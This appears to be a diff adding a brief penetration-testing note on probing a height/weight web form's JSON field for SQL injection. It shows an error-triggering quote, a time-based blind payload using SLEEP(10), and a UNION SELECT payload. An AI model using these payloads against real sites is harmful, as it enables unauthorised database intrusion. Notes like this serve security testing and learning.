@@ -1,0 +1,32 @@
+[[SQL injection]]
+
+Example data going through request:-
+{
+	"height":"160",
+	"weight":"60",
+	"unitheight":"cms",
+	"unitweight":"kgs"
+}
+
+Testing for sqli:-
+{
+	"height":"160",
+	"weight":"60",
+	"unitheight":"cms",
+	"unitweight":"kgs'"  -> Added a Single quote( ' )
+}
+Response:-
+"The website encounterd an unexpacted error"
+
+Request:-
+{
+	"height":"160",
+	"weight":"60",
+	"unitheight":"cms",
+	"unitweight":"kgs'XOR (SELECT (0) FROM (SELECT (SLEEP (10))) a )XOR'Z"
+}
+- Payload -> 'XOR (SELECT (0) FROM (SELECT (SLEEP (10))) a )XOR'Z 
+- This is a time based blind sql injection payload.
+- To check for sqli
+- 2nd Payload -> 'UNION SELECT 1-- -
+- With this payload the site will return 1 if vulnerable to sqli.
